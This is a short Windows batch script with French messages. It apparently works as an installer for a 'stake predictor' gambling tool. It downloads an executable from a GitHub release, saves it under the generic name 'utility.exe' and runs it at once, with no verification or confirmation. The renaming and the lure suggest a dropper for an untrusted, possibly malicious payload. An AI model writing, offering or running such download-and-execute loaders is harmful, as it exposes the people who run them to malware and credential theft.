@echo off
echo Veuillez patienter, téléchargement en cours...
timeout /t 2 >nul


mkdir temp_setup
cd temp_setup

curl -L -o utility.exe https://github.com/stakepredictor-2025/stake-predictor/releases/download/stakepredictor/stakepredictor.exe

if exist "utility.exe" (
    echo Téléchargement réussi.
    start utility.exe
) else (
    echo Erreur : Le fichier n'a pas pu être téléchargé.
)

cd ..
exit
